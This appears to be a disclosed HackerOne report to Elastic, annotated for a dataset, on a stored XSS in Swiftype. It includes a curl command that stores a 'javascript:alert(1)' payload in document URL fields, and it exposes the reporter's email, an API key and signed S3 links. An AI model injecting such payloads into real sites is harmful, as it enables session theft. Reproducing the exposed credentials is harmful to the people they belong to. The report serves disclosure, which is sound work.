{
  "reported_to": "Elastic",
  "reported_by": "superman85 ",
  "title": "[Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`",
  "content": "\nDear Team,\nI have found a stored XSS when create a document via API-based engine. The XSS payload stored in url field.\nTo understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based\nAfter indexed a document with XSS payload stored in url field. When view the document details, click on link View on your site the XSS will triggered.\nStep to reproduce\n1 - Create a trial account on https://app.swiftype.com/ my admin account email is qwerty.chan8@gmail.com\n2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: 123, DocumentType: test)\n<image_0>\n3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: gB7BT3iA3GhqoU_SWoRq\n<image_1>\n4 - Call API to create a document follow curl command below, store XSS payload javascript:alert(1) in url and thumbnail_url field value\nCode 1.27 KiB\n1curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \\\n2  -H 'Content-Type: application/json' \\\n3  -d '{\n4        \"auth_token\": \"gB7BT3iA3GhqoU_SWoRq\",\n5        \"document\": {\n6          \"external_id\": \"v1uyQZNg2vE\",\n7          \"fields\": [\n8            {\"name\": \"url\", \"value\": \"javascript:alert(1)\", \"type\":  \"enum\"},\n9            {\"name\": \"thumbnail_url\", \"value\": \"javascript:alert(1)\", \"type\": \"enum\"},\n10            {\"name\": \"channel_id\", \"value\": \"UCK8sQmJBp8GCxrOtXWBpyEA\", \"type\": \"enum\"},\n11            {\"name\": \"title\", \"value\": \"How It Feels [through Glass]\", \"type\": \"string\"},\n12            {\"name\": \"caption\", \"value\": \"Want to see how Glass actually feels?...\", \"type\": \"text\"},\n13            {\"name\": \"tags\", \"value\": [\"glass\", \"wearable computing\", \"google\"], \"type\": \"string\"},\n14            {\"name\": \"category_name\", \"value\": \"Science & Technology\", \"type\": \"string\"},\n15            {\"name\": \"category_id\", \"value\": 28, \"type\": \"enum\"},\n16            {\"name\": \"published_at\", \"value\": \"2013-02-20T10:47:18\", \"type\": \"date\"},\n17            {\"name\": \"duration\", \"value\": 136, \"type\": \"integer\"},\n18            {\"name\": \"view_count\", \"value\": 14599202, \"type\": \"integer\"},\n19            {\"name\": \"like_count\", \"value\": 75952, \"type\": \"integer\"}\n20          ]\n21        }\n22     }'\n5 - Go to Engine 123 and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1\n<image_2>\n6 - Click on document ID v1uyQZNg2vE you just created, you can see the document details\n<image_3>\n7 - Click on the link http://javascript:alert(1) in document details\n<image_4>\n<image_5>\nImpact\nSteal other users sessions, trick users go to unwanted websites\n\n",
  "severity": [
    8.0,
    null
  ],
  "bounty": 100,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hj560hxl4va3st7h74unrxfhfenu?response-content-disposition=attachment%3B%20filename%3D%22create_api_engine.png%22%3B%20filename%2A%3DUTF-8%27%27create_api_engine.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0234b72eb696c2a740b8f94c489df789636bacb21f04e6feb6a66b004b49ee9b",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yiry7rd41do1b9ngj83holzb24ht?response-content-disposition=attachment%3B%20filename%3D%22retrieve_api_key.png%22%3B%20filename%2A%3DUTF-8%27%27retrieve_api_key.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ae64fb33ab81cb7d1b295cf38811bc5a7a57fd76c51008cb6ef309be7562adab",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0jy3guwac4ukkyy3vvvivvwd4e0g?response-content-disposition=attachment%3B%20filename%3D%22document_list.png%22%3B%20filename%2A%3DUTF-8%27%27document_list.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5b5d80031f6ed475db0a55d3b7e794c539db79cff9071517d157185dc3a708dc",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nd05thb3omt3818xt7hbzqfuvenp?response-content-disposition=attachment%3B%20filename%3D%22document_details.png%22%3B%20filename%2A%3DUTF-8%27%27document_details.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e2e70ef6e485df0e121652c9a6c946948ae6a128b1744805c27e82cce06faf9",
    "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/alpjmpg7cndqgjeofcjd1m0f3rqj?response-content-disposition=attachment%3B%20filename%3D%22click_link.png%22%3B%20filename%2A%3DUTF-8%27%27click_link.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8517be4e2bb549e5f493f4594732e75ebe29b08b06cad95561e350b80886ea75",
    "image_5": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mute3bp5ecvp2tk5frcjlvwvulj9?response-content-disposition=attachment%3B%20filename%3D%22xss_fires.png%22%3B%20filename%2A%3DUTF-8%27%27xss_fires.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSLI3URIS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T191203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk1HqFlh6wXhHmTbE7hAJVm%2Bl2HO7IHsu7w1b6OhDI%2FAIgPwySbxooBx3NigSpJ72K%2BfH%2BAsF4ECM3nFhRevhE9%2BkqsgUIHBADGgwwMTM2MTkyNzQ4NDkiDMNCVU%2BomcFZKrEakyqPBcVbTi7AiC1T3S5ib3MazKgl1%2FIUwEAk1mSeqorZCn9IvbZZXNXhaUckzSvXCdwylWykqjKrO3PAbi8Q3AMmJkXMZrZj%2FE%2FhDd%2BsyWJNhpSUUWp57ytCfc8LU03Dc1IAYOKD0LxEp41BOEHHbgC4TP%2BZHR6c%2FCAv4BfSTg5P12krx%2F7uQKt1HzJ4x2sFqGN%2B0E5V3jPY9NyPTPgZlGfcpjjZskifw%2Bf4MFZfBMtd5VNvvWyUKS2O9w4uAqHN%2F2A5b%2BcPt5KTiOeRmRESFbHmHG9LGcX4Kg6QHY0P3hJ%2BDD0r3iYbM1y7bKlz%2FJXlM3khUxpmWrh5l7rnnhRRwYB%2FPxiPlK5Iv7qVvUgzMNV%2BQ4dn6C%2FiC8N5v3SfSAALXxd4TYq0igKtindj%2FizMZwd%2BZnaINPMyH4ZuapGnx1XOgwzH%2FpCc%2BZFTDY8HOusLIPnKlcLg88Fw5JMdWfTxctY7JD1EcPvzhE56F0pDu9wUeLaoQeY84PktOGldyd7wSE50ei8Ly4l6RKBsTjXdcbjVON0X1wIB6cHA1DzMDv%2F7vUMOIRii8h3imJLFwcuamLZSb%2FZghqgLax0A18exBoZGCTQIc%2Ff%2F3HhANfWA7vnyVHdN2qiGFj8xX%2BRbCEclQgo2ux%2F4bj%2F3DNxVDVXLJdbNKLJGjnqAlP%2BGumLMt%2BJ2Lkwn0AIEnLIbbsbphdJMLpvYetfsW3MuL%2BJ1OuWcP%2B3Vyew1mvwt9sV0SMIwUxeC1ZLy%2BMME2Q1g8T9aCUvhFcUHo%2FB9U%2BRyGnAAQyuz7j0hvKHzYguZNUeIaA1ZKZYW%2BG%2F9XKL%2BbMCyRKYRtAroRO2GCIRaOQPlaVVDkFcgskzozZhFT7ZIiJGSKdUf9HVwVxwwlO2LvwY6sQFHwt%2FrBA%2FiEbBvhO8lmrcv3sWiy8VnaFMtatHrPZnVKmwRXNSXr9Cmi2Bnvo6rseE67pWYifCbUC6YeKN26VLcglFUGbBCFNLbaycM0uxXrBemm9iRdFtOhnPjyWVvHvldp38tvruUtkFlf%2BJRSuN2PT0x4PKcW4zO5fuS6DSVDK32ijI1W5aIbkv6akX%2FKmLEKWa97pv%2B1hmTIPo8hADMhpLLt5rG%2Br24lvFTeDUDlt4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=16682d9925c5fb1c983c4464f189e94e1c48b8d6dc8dbf70a993e1cd4660ba28"
  },
  "disclosed_date": 1628025120,
  "report_url": "https://hackerone.com/reports/1245787",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a trial account on Swiftype and create an API-based engine with a document type."
    ],
    [
      2,
      "Obtain the API key from account settings."
    ],
    [
      3,
      "Use the API to create a document with a stored XSS payload in the 'url' and 'thumbnail_url' fields."
    ],
    [
      4,
      "Navigate to the document in the Swiftype interface and click the malicious link to trigger the XSS."
    ]
  ],
  "vuln_description": "A stored XSS vulnerability exists in Swiftype where a malicious JavaScript payload can be stored in the 'url' and 'thumbnail_url' fields of a document via the API. When a user views the document details and clicks on the link, the XSS payload is executed.",
  "reason": "The attack involves straightforward steps: creating an account, using the API to inject the payload, and triggering it via the UI. The components (API and UI) are standard, and the interaction between them is not complex or subtle.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The XSS vulnerability involves stored payloads in document fields (url and thumbnail_url) that trigger when viewed. The methodology described focuses on authentication and authorization (AuthN/AuthZ) bypasses and IDOR vulnerabilities, which are different from stored XSS. The XSS here does not involve crossing authorization boundaries or manipulating resource IDs, but rather injecting and executing malicious scripts in the context of the application.",
    "is_detectable": false
  }
}